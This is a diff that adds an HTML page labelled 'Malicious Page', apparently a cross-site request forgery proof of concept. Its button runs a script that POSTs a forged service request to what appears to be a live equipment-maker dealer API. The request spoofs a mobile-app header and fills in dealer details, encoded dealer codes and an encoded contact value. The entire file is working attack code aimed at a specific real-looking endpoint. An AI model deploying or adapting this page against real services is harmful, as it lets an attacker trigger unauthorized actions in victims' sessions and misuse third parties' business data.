@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Malicious Page</title>
+  </head>
+  <body>
+    <h1>Click to submit</h1>
+    <button onclick="sendRequest()">Submit Request</button>
+
+    <script>
+      function sendRequest() {
+        const data = {
+          serviceRequestId: "",
+          serviceRequestGUID: "1739648417091",
+          dealerName: "CSRF-LEI SHING HONG MACHINERY CAT (East China)",
+          locationPhone: "86 (21) 5048-0051",
+          siteAddress: "NO 285 GANGAO ROAD WAI GAO QIAO FREE TRADE ZONE",
+          serialNo: "",
+          modelNo: "E033",
+          serviceType: "PERIODIC",
+          description: "testt",
+          engineParameters: "",
+          faultCode: "",
+          attachmentCount: 0,
+          engineRecentData: [],
+          syncOnline: 0,
+          deleteRaiseReq: 0,
+          deleteSyncFlag: 1,
+          submittedOn: "2025-02-15T19:11:52.211Z",
+          syncTime: null,
+          fmiCode: "",
+          typeId: "",
+          faultDescription: "",
+          engineSerialNumber: "3F85981",
+          parentDealerCode: "yXrRD4Og5dUToBW9A0DOgg==",
+          type: "Main",
+          srSource: 0,
+          DealerCode: "3V/Q/+cmlxQIKiQ+cPKXrA==",
+          productID: "",
+          machineSerialNo: "",
+          DealerCont: "bHNobWNhbGxjZW50ZXJAbHNoLmNvbQ=="
+        };
+
+        fetch("https://poweronsiteapi.cat.com/api/v4/DealerLocater/RaiseRequest", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Requested-With": "com.cat.itdd.mobile.mypowersystems"
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => console.log("Success:", data))
+        .catch(error => console.error("Error:", error));
+      }
+    </script>
+  </body>
+</html>
